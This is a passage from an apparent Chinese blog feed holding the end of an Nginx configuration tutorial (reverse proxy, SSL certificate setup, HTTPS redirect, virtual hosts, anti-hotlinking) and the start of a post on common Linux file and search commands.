class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> server-api&#123;</span><br><span class="line">    <span class="comment"># api 代理服务地址</span></span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3110</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">upstream</span> server-resource&#123;</span><br><span class="line">    <span class="comment"># 静态资源 代理服务地址</span></span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3120</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">3111</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;      <span class="comment"># 这里指定域名</span></span><br><span class="line">    <span class="attribute">root</span> /home/www/server-statics;</span><br><span class="line">    <span class="comment"># 匹配 api 路由的反向代理到API服务</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/api/</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-api;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 假设这里验证码也在API服务中</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/captcha</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-api;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 假设你的图片资源全部在另外一个服务上面</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/img/</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-resource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 路由在前端，后端没有真实路由，在路由不存在的 404状态的页面返回 /index.html</span></span><br><span class="line">    <span class="comment"># 这个方式使用场景，你在写React或者Vue项目的时候，没有真实路由</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html =<span class="number">404</span>;</span><br><span class="line">        <span class="comment">#                               ^ 空格很重要</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-4-代理转发连接替换"><a href="#10-4-代理转发连接替换" class="headerlink" title="10.4 代理转发连接替换"></a>10.4 代理转发连接替换</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~/api/upload</span> &#123;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /wfs/v1/upload <span class="literal">break</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://wfs-api;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-5-ssl配置"><a href="#10-5-ssl配置" class="headerlink" title="10.5 ssl配置"></a>10.5 ssl配置</h3><ul><li>超文本传输安全协议（缩写：HTTPS，英语：Hypertext Transfer Protocol Secure）是超文本传输协议和SSL/TLS的组合，用以提供加密通讯及对网络服务器身份的鉴定。HTTPS连接经常被用于万维网上的交易支付和企业信息系统中敏感信息的传输。HTTPS不应与在RFC 2660中定义的安全超文本传输协议（S-HTTP）相混。HTTPS 目前已经是所有注重隐私和安全的网站的首选，随着技术的不断发展，HTTPS 网站已不再是大型网站的专利，所有普通的个人站长和博客均可以自己动手搭建一个安全的加密的网站。</li></ul><ul><li>创建<code>SSL</code>证书，如果你购买的证书，就可以直接下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/nginx/ssl</span><br><span class="line"><span class="comment"># 创建了有效期100年，加密强度为RSA2048的SSL密钥key和X509证书文件。</span></span><br><span class="line">sudo openssl req -x509 -nodes -days 36500 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt</span><br><span class="line"><span class="comment"># 上面命令，会有下面需要填写内容</span></span><br><span class="line">Country Name (2 letter code) [AU]:US</span><br><span class="line">State or Province Name (full name) [Some-State]:New York</span><br><span class="line">Locality Name (eg, city) []:New York City</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:Bouncy Castles, Inc.</span><br><span class="line">Organizational Unit Name (eg, section) []:Ministry of Water Slides</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:your_domain.com</span><br><span class="line">Email Address []:admin@your_domain.com</span><br></pre></td></tr></table></figure><ul><li>创建自签证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">首先，创建证书和私钥的目录</span><br><span class="line"><span class="comment"># mkdir -p /etc/nginx/cert</span></span><br><span class="line"><span class="comment"># cd /etc/nginx/cert</span></span><br><span class="line">创建服务器私钥，命令会让你输入一个口令：</span><br><span class="line"><span class="comment"># openssl genrsa -des3 -out nginx.key 2048</span></span><br><span class="line">创建签名请求的证书（CSR）：</span><br><span class="line"><span class="comment"># openssl req -new -key nginx.key -out nginx.csr</span></span><br><span class="line">在加载SSL支持的Nginx并使用上述私钥时除去必须的口令：</span><br><span class="line"><span class="comment"># cp nginx.key nginx.key.org</span></span><br><span class="line"><span class="comment"># openssl rsa -in nginx.key.org -out nginx.key</span></span><br><span class="line">最后标记证书使用上述私钥和CSR：</span><br><span class="line"><span class="comment"># openssl x509 -req -days 365 -in nginx.csr -signkey nginx.key -out nginx.crt</span></span><br></pre></td></tr></table></figure><p>查看目前nginx编译选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbin/nginx -V</span><br></pre></td></tr></table></figure><p>输出下面内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx version: nginx/1.7.8</span><br><span class="line">built by gcc 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC)</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --prefix=/usr/local/nginx-1.7.8 --with-http_ssl_module --with-http_spdy_module --with-http_stub_status_module --with-pcre</span><br></pre></td></tr></table></figure><p>如果依赖的模块不存在，可以进入安装目录，输入下面命令重新编译安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx --with-http_stub_status_module --with-http_ssl_module</span><br></pre></td></tr></table></figure><p>运行完成之后还需要<code>make</code> (不用make install)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份nginx的二进制文件</span></span><br><span class="line">cp -rf /usr/<span class="built_in">local</span>/nginx/sbin/nginx　 /usr/<span class="built_in">local</span>/nginx/sbin/nginx.bak</span><br><span class="line"><span class="comment"># 覆盖nginx的二进制文件</span></span><br><span class="line">cp -rf objs/nginx   /usr/<span class="built_in">local</span>/nginx/sbin/</span><br></pre></td></tr></table></figure><p>HTTPS server</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/nginx/ssl/nginx.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/nginx.key;</span><br><span class="line">    <span class="comment"># 禁止在header中出现服务器版本，防止黑客利用版本漏洞攻击</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="comment"># 设置ssl/tls会话缓存的类型和大小。如果设置了这个参数一般是shared，buildin可能会参数内存碎片，默认是none，和off差不多，停用缓存。如shared:SSL:10m表示我所有的nginx工作进程共享ssl会话缓存，官网介绍说1M可以存放约4000个sessions。 </span></span><br><span class="line">    <span class="attribute">ssl_session_cache</span>    shared:SSL:<span class="number">1m</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 客户端可以重用会话缓存中ssl参数的过期时间，内网系统默认5分钟太短了，可以设成30m即30分钟甚至4h。</span></span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">5m</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择加密套件，不同的浏览器所支持的套件（和顺序）可能会不同。</span></span><br><span class="line">    <span class="comment"># 这里指定的是OpenSSL库能够识别的写法，你可以通过 openssl -v cipher 'RC4:HIGH:!aNULL:!MD5'（后面是你所指定的套件加密算法） 来看所支持算法。</span></span><br><span class="line">    <span class="attribute">ssl_ciphers</span>  HIGH:!aNULL:!MD5;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置协商加密算法时，优先使用我们服务端的加密套件，而不是客户端浏览器的加密套件。</span></span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span>  <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-6-强制将http重定向到https"><a href="#10-6-强制将http重定向到https" class="headerlink" title="10.6 强制将http重定向到https"></a>10.6 强制将http重定向到https</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  example.com;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^</span> https://<span class="variable">$http_host</span><span class="variable">$request_uri</span>? <span class="literal">permanent</span>;    <span class="comment"># 强制将http重定向到https</span></span><br><span class="line">    <span class="comment"># 在错误页面和“服务器”响应头字段中启用或禁用发射nginx版本。 防止黑客利用版本漏洞攻击</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-7-两个虚拟主机"><a href="#10-7-两个虚拟主机" class="headerlink" title="10.7 两个虚拟主机"></a>10.7 两个虚拟主机</h3><ul><li>纯静态<code>-html</code> 支持</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>          <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>     www.domain1.com;</span><br><span class="line">        <span class="attribute">access_log</span>      logs/domain1.access.log main;</span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">index</span> index.html;</span><br><span class="line">            <span class="attribute">root</span>  /var/www/domain1.com/htdocs;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>          <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>     www.domain2.com;</span><br><span class="line">        <span class="attribute">access_log</span>      logs/domain2.access.log main;</span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">index</span> index.html;</span><br><span class="line">            <span class="attribute">root</span>  /var/www/domain2.com/htdocs;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-8-虚拟主机标准配置"><a href="#10-8-虚拟主机标准配置" class="headerlink" title="10.8 虚拟主机标准配置"></a>10.8 虚拟主机标准配置</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>          <span class="number">80</span> default;</span><br><span class="line">    <span class="attribute">server_name</span>     _ *;</span><br><span class="line">    <span class="attribute">access_log</span>      logs/default.access.log main;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">       <span class="attribute">index</span> index.html;</span><br><span class="line">       <span class="attribute">root</span>  /var/www/default/htdocs;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-9-防盗链"><a href="#10-9-防盗链" class="headerlink" title="10.9 防盗链"></a>10.9 防盗链</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(gif|jpg|png|swf|flv)$</span> &#123;</span><br><span class="line">   <span class="attribute">root</span> html</span><br><span class="line">   valid_referers <span class="literal">none</span> <span class="literal">blocked</span> <span class="regexp">*.nginxcn.com</span>;</span><br><span class="line">   <span class="attribute">if</span> (<span class="variable">$invalid_referer</span>) &#123;</span><br><span class="line">     <span class="attribute">rewrite</span><span class="regexp"> ^/</span> www.nginx.cn</span><br><span class="line">     <span class="comment">#return 404;</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-10虚拟目录配置"><a href="#10-10虚拟目录配置" class="headerlink" title="10.10虚拟目录配置"></a>10.10虚拟目录配置</h3><p>alias指定的目录是准确的，root是指定目录的上级目录，并且该上级目录要含有location指定名称的同名目录。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /img/ &#123;</span><br><span class="line">    <span class="attribute">alias</span> /var/www/image/;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 访问/img/目录里面的文件时，ningx会自动去/var/www/image/目录找文件</span></span><br><span class="line"><span class="attribute">location</span> /img/ &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/www/image;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 访问/img/目录下的文件时，nginx会去/var/www/image/img/目录下找文件。]</span></span><br></pre></td></tr></table></figure><h3 id="10-11-防盗图配置"><a href="#10-11-防盗图配置" class="headerlink" title="10.11 防盗图配置"></a>10.11 防盗图配置</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \/public\/(css|js|img)\/.*\.(js|css|gif|jpg|jpeg|png|bmp|swf)</span> &#123;</span><br><span class="line">    <span class="attribute">valid_referers</span> <span class="literal">none</span> <span class="literal">blocked</span> <span class="regexp">*.jslite.io</span>;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$invalid_referer</span>) &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/</span>  http://wangchujiang.com/piratesp.png;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-12-屏蔽-git等文件"><a href="#10-12-屏蔽-git等文件" class="headerlink" title="10.12 屏蔽.git等文件"></a>10.12 屏蔽.git等文件</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ (.git|.gitattributes|.gitignore|.svn)</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="域名路径加不加需要都能正常访问"><a href="#域名路径加不加需要都能正常访问" class="headerlink" title="域名路径加不加需要都能正常访问"></a>域名路径加不加需要都能正常访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://wangchujiang.com/api/index.php?a=1&amp;name=wcj</span><br><span class="line">                                  ^ 有后缀</span><br><span class="line"></span><br><span class="line">http://wangchujiang.com/api/index?a=1&amp;name=wcj</span><br><span class="line">                                 ^ 没有后缀</span><br></pre></td></tr></table></figure><ul><li><code>nginx rewrite</code>规则如下：</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^/(.*)/$</span> /index.php?/<span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line"><span class="attribute">if</span> (!-d <span class="variable">$request_filename</span>)&#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$rule_1</span> <span class="number">1</span><span class="variable">$rule_1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (!-f <span class="variable">$request_filename</span>)&#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$rule_1</span> <span class="number">2</span><span class="variable">$rule_1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$rule_1</span> = <span class="string">"21"</span>)&#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/</span> /index.php <span class="literal">last</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="十一、错误问题"><a href="#十一、错误问题" class="headerlink" title="十一、错误问题"></a>十一、错误问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The plain HTTP request was sent to HTTPS port</span><br></pre></td></tr></table></figure><ul><li>解决办法，<code>fastcgi_param HTTPS $https if_not_empty</code> 添加这条规则，</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl; <span class="comment"># 注意这条规则</span></span><br><span class="line">    <span class="attribute">server_name</span>  my.domain.com;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">fastcgi_param</span> HTTPS <span class="variable">$https</span> if_not_empty;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> HTTPS <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/ssl/certs/your.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/ssl/private/your.key;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="comment"># Your config here...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="十二、精品文章参考"><a href="#十二、精品文章参考" class="headerlink" title="十二、精品文章参考"></a>十二、精品文章参考</h2><ul><li><a href="https://my.oschina.net/u/3341316/blog/877206" target="_blank" rel="noopener">负载均衡原理的解析</a></li><li><a href="http://blog.githuber.cn/posts/73" target="_blank" rel="noopener">Nginx泛域名解析，实现多个二级域名 </a></li><li><a href="https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/" target="_blank" rel="noopener">深入 NGINX: 我们如何设计性能和扩展</a></li><li><a href="https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/" target="_blank" rel="noopener">Inside NGINX: How We Designed for Performance &amp; Scale</a></li><li><a href="http://tengine.taobao.org/book/index.html" target="_blank" rel="noopener">Nginx开发从入门到精通</a></li><li><a href="http://os.51cto.com/art/201703/535326.htm#topx" target="_blank" rel="noopener">Nginx的优化与防盗链</a></li><li><a href="https://segmentfault.com/a/1190000009769143" target="_blank" rel="noopener">实战开发一个Nginx扩展 (Nginx Module)</a></li><li><a href="https://my.oschina.net/xshuai/blog/917097" target="_blank" rel="noopener">Nginx+Keepalived(双机热备)搭建高可用负载均衡环境(HA)</a></li><li><a href="http://www.huxd.org/articles/2017/07/24/1500890692329.html" target="_blank" rel="noopener">Nginx 平滑升级</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIxNzg5ODE0OA==&amp;mid=2247483708&amp;idx=1&amp;sn=90b0b1dccd9c337922a0588245277666&amp;chksm=97f38cf7a08405e1928e0b46d923d630e529e7db8ac7ca2a91310a075986f8bcb2cee5b4953d#rd" target="_blank" rel="noopener">Nginx最新模块—ngx_http_mirror_module分析可以做版本发布前的预先验证，进行流量放大后的压测等等</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Nginx&lt;/code&gt; 是一款面向性能设计的 &lt;code&gt;HTTP&lt;/code&gt; 服务器，能反向代理 &lt;code&gt;HTTP&lt;/code&gt;，&lt;code&gt;HTTPS&lt;/code&gt; 和邮件相关(&lt;code&gt;SMTP&lt;/code&gt;，&lt;code
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="Nginx" scheme="http://blog.poetries.top/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>日常频繁使用的Linux命令</title>
    <link href="http://blog.poetries.top/2018/02/25/linux-frequently-use-command/"/>
    <id>http://blog.poetries.top/2018/02/25/linux-frequently-use-command/</id>
    <published>2018-02-25T01:32:41.000Z</published>
    <updated>2018-04-10T03:33:13.991Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、文件管理"><a href="#一、文件管理" class="headerlink" title="一、文件管理"></a>一、文件管理</h2><p><strong>1.1 创建删除文件</strong></p><ul><li><code>mkdir</code>(<code>-p</code>多层创建)</li><li><code>touch</code></li><li><code>cp</code>(<code>-r</code>递归复制)</li><li><code>rm -rf</code></li><li><code>mv</code>(改名、移动剪切)</li><li><code>cat</code> (打印)</li></ul><p><strong>1.2 创建删除软连接</strong></p><blockquote><p>linux下的软链接类似于windows下的快捷方式。常用于实际路径很深，每次进入的时候需要花费一定时间，此时我们在根目录创建一个软链接指向该目录，那么我们进入该软连接其实就是进入了软链接指向的实际目录。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln  -s  /data/elastic/plugin/ik/custom  myES</span><br></pre></td></tr></table></figure><ul><li>以上命令中的 <code>/data/elastic/plugin/ik/custom</code> 就是源文件，<code>myES</code> 是链接文件名， 其作用是当进入 <code>myES</code> 目录，实际上是链接进入了 <code>/data/elastic/plugin/ik/custom</code> 目录</li><li><strong>删除软链接</strong> <code>rm -rf  myES</code> <ul><li>注意不是 <code>rm -rf  myES/</code></li></ul></li></ul><p><strong>1.3 重定向命令</strong></p><ul><li><code>ls  -l  /etc &gt; /home/myback.txt</code>     (覆盖重定向)　把显示的结果覆盖到<code>/home/myback.txt</code>中去</li><li><code>ls  -l  /etc &gt;&gt; /home/myback.txt</code>     (追加重定向)　把显示的结果追加到<code>/home/myback.txt</code>中去 </li></ul><p><strong>1.4 查看文件大小</strong></p><ul><li>查看某个文件夹当前所占用的空间使用 <code>du -h file</code></li><li>查看当前目录下的所有文件各个大小 <code>du -sh *</code>  </li></ul><h2 id="二、搜索命令"><a href="#二、搜索命令" class="headerlink" title="二、搜索命令"></a>二、搜索命令</h2><p><strong>2.1 管道过滤</strong></p><ul><li>使用管道命令过滤搜索的内容 <code>ls -l /etc | more</code></li></ul><p><strong>2.2 查询命令</strong>  </p><ul><li><strong>which</strong></li></ul><blockquote><p>在<code>PATH</code>变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># `-a`：将所有由`PATH`目录中可以找到的命令均列出来，而不是只列出第一个被找到的命令</span></span><br><span class="line">[root@www ~] <span class="comment"># which ifconfig</span></span><br><span class="line">/sbin/ifconfig</span><br></pre></td></tr></table></figure><ul><li><strong>whereis</strong><ul><li><code>-b</code> 只查找二进制格式的文件</li><li><code>-m</code> 只查找在说明文件manual路径下的文件</li><li><code>-s</code> 只招<code>source</code>源文件</li><li><code>-u</code> 查找不在上述三个选项当中的其他特殊文件</li></ul></li></ul><blockquote><p>只能用于程序名的搜索，而且只搜索二进制文件（参数<code>-b</code>）、<code>man</code>说明文件（参数<code>-m</code>）和源代码文件（参数<code>-s</code>）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis [-bmsu] 文件或目录名</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] <span class="comment"># whereis ifconfig</span></span><br><span class="line">ifconfig: /sbin/ifconfig /usr/share/man/man8/ifconfig.8.gz</span><br><span class="line">[root@www ~] <span class="comment"># whereis -m ifconfig</span></span><br><span class="line">ifconfig: /usr/share/man/man8/ifconfig.8.gz</span><br></pre></td></tr></table></figure><ul><li><strong>locate</strong><ul><li><code>-i</code>：忽略大小写差异；</li><li><code>-r</code>：后面可接正则表达式的实现方式。</li></ul></li></ul><blockquote><p>相当于<code>find -name</code>，可快速查找文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate [-ir] keyword</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] <span class="comment"># locate passwd</span></span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/passwd-</span><br><span class="line">/etc/news/passwd.nntp</span><br><span class="line">/etc/pam.d/passwd</span><br></pre></td></tr></table></figure><ul><li><strong>find查找任何文件</strong></li></ul><blockquote><p>最常用和最强大的查找命令，可以用它找到任何想找的文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 